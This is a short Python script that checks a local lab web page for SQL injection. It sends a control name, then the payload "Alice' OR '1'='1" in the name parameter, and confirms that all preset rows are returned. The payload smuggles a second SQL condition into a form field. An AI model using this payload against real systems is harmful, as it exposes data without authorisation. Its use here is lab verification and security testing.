#!/usr/bin/env python3
import http.client
import urllib.parse
import re
import html
import sys

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S001/index.php"

def fetch(name):
    query = urllib.parse.urlencode({"name": name}, quote_via=urllib.parse.quote)
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    try:
        conn.request("GET", PATH + "?" + query, headers={"Host": f"{HOST}:{PORT}"})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        if resp.status != 200:
            raise RuntimeError(f"HTTP status {resp.status}")
        return body
    finally:
        conn.close()

def parse_rows(body):
    rows = []
    for m in re.finditer(r'<p>ID\s*(\d+)：([^<]*)</p>', body):
        rows.append((int(m.group(1)), html.unescape(m.group(2))))
    return rows

def main():
    ordinary_rows = parse_rows(fetch("Alice"))
    print("ordinary rows:", ordinary_rows)
    if len(ordinary_rows) != 1 or ordinary_rows[0] != (1, "Alice"):
        print("FAIL ordinary control: expected exactly [(1, 'Alice')].")
        return 2

    test_rows = parse_rows(fetch("Alice' OR '1'='1"))
    print("test rows:", test_rows)
    expected = {(1, "Alice"), (2, "Bob"), (3, "Carol")}
    if len(test_rows) != 3 or set(test_rows) != expected:
        print("FAIL injection test: expected all three preset rows.")
        return 3

    print("PASS: ordinary=1 Alice row; test=all 3 preset rows; read-only test did not modify data.")
    return 0

if __name__ == "__main__":
    sys.exit(main())
